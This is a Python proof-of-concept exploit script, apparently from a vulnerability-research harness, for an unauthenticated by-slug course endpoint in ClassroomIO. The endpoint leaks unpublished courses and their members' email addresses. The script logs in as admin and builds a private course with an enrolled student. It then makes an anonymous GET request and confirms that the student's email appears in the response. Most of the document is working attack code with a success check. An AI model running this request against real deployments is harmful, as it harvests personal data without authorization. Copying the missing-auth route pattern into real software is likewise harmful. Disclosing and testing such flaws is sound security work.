#!/usr/bin/env python3
"""
VULN-016 (F-36) — Unauthenticated GET /course/slug/:slug leaks any ACTIVE course
                  (unpublished / private) together with its member roster + emails.

Vulnerable code (targets/classroomio/):
  * route:  apps/api/src/routes/course/course.ts:117-132   (.get('/slug/:slug', ...) — NO auth middleware)
  * service: packages/core/src/services/course/course.ts:212-266  (getCourse -> getCourseWithRelations)
  * query:  packages/db/src/queries/course/course.ts:428-436       (filters ONLY status='ACTIVE')
            packages/db/src/queries/course/course.ts:462-507       (joins group members incl. profile.email)
  * hardened sibling (contrast): packages/db/src/queries/course/public-course.ts:129-131
            (the public channel requires type='PUBLIC' && isPublished && status='ACTIVE')

Class: CWE-639 / CWE-200 broken object-level authorization + excessive data exposure (unauthenticated).

The flaw: the by-slug endpoint has no auth/org middleware, and its query filters only on
status='ACTIVE'. Course defaults make EVERY course match (status defaults 'ACTIVE',
isPublished defaults false, type defaults 'SELF_PACED'), so an anonymous caller who knows/guesses
a slug receives the full course object of an unpublished, non-public course INCLUDING the group
member roster with each member's email address — data even an authenticated public catalog view
would not expose.

Exploitation idea: an admin builds a private (unpublished, SELF_PACED) course with members; an
UNAUTHENTICATED client GETs /course/slug/<slug> and reads the private course + member emails.

Success proof: with NO session cookie, the response is HTTP 200 and contains the email address of a
course member (an enrolled student) — an anonymous PII leak from a non-public course.
"""
import os
import sys
import json
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, admin_login, create_course, make_student, API, BASE_URL, rid, psql  # noqa: E402

VULN = "VULN-016"
HERE = os.path.dirname(os.path.abspath(__file__))


def anon_get(path):
    """A truly unauthenticated GET — no cookie jar, just the trusted Origin header."""
    return requests.get(API + path, headers={"Origin": BASE_URL}, timeout=30, allow_redirects=False)


def main():
    banner(VULN, "Unauth GET /course/slug/:slug leaks private course + member emails")
    log("INFO", "route apps/api/src/routes/course/course.ts:117 has NO auth middleware")
    log("INFO", "query packages/db/src/queries/course/course.ts:428-436 filters only status='ACTIVE'")

    # --- Precondition: an admin creates a PRIVATE (unpublished, non-public) course ---
    log("SETUP", "admin login")
    admin = admin_login()

    course = create_course(admin, title=f"Confidential Draft {rid('c')}", ctype="SELF_PACED")
    cid = course["id"]
    # Give the course a slug the way the app does (PUT /course/:id accepts slug); it stays UNPUBLISHED.
    slug = f"cvehunt-016-{rid('slug')}"
    r = admin.put(f"/course/{cid}", org=True, json={"slug": slug, "title": course["title"]})
    if r.status_code != 200:
        log("FAIL", f"could not set course slug: HTTP {r.status_code} {r.text[:200]}")
        verdict(VULN, "FAILED", "precondition (set slug) failed")
        sys.exit(1)

    dbrow = psql(f"select is_published, type, status from course where id='{cid}'")
    log("SETUP", f"course {cid} slug={slug}  (db is_published|type|status = {dbrow})")

    # Enroll a real STUDENT so the course has a member with a real email in its roster.
    log("SETUP", "enrolling a STUDENT member (gives the course a roster with a real email)")
    _stu, info = make_student(admin, course_id=cid)
    victim_email = info["email"]
    log("SETUP", f"member email that must NOT leak to anonymous callers: {victim_email}")

    # --- The attack: an UNAUTHENTICATED client reads the private course by slug ---
    log("STEP", f"UNAUTHENTICATED (no cookie) GET /course/slug/{slug}")
    resp = anon_get(f"/course/slug/{slug}")
    log("INFO", f"  response: HTTP {resp.status_code}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"GET {API}/course/slug/{slug}   (no Cookie header)\n")
        f.write(f"HTTP {resp.status_code}\n\n")
        f.write(resp.text)

    if resp.status_code != 200:
        verdict(VULN, "FAILED", f"anonymous by-slug read returned HTTP {resp.status_code}")
        log("FAIL", "endpoint did not serve the private course to an anonymous caller")
        sys.exit(1)

    data = resp.json().get("data", {})
    group = data.get("group") or {}
    members = group.get("members") or []
    leaked_emails = [(m.get("profile") or {}).get("email") for m in members]
    leaked_emails = [e for e in leaked_emails if e]

    is_published = data.get("isPublished")
    ctype = data.get("type")
    status = data.get("status")
    log("INFO", f"  served course: isPublished={is_published} type={ctype} status={status}")
    log("INFO", f"  leaked member roster emails: {leaked_emails}")

    email_leaked = victim_email in leaked_emails or victim_email in resp.text
    private_course = (is_published is False) and (ctype != "PUBLIC")

    if email_leaked and private_course:
        log("PROOF", f"anonymous GET returned an UNPUBLISHED, non-PUBLIC course AND leaked the member "
                     f"email {victim_email!r} in the roster — a pre-auth PII + private-content disclosure")
        verdict(VULN, "CONFIRMED", "unauth by-slug read leaks a private course + member emails")
        log("OK", "exploit confirmed — no authentication, member emails harvested from a draft course")
        sys.exit(0)

    verdict(VULN, "FAILED", f"email_leaked={email_leaked} private_course={private_course}")
    log("FAIL", "expected an anonymous leak of a private course's member email")
    sys.exit(1)


if __name__ == "__main__":
    main()
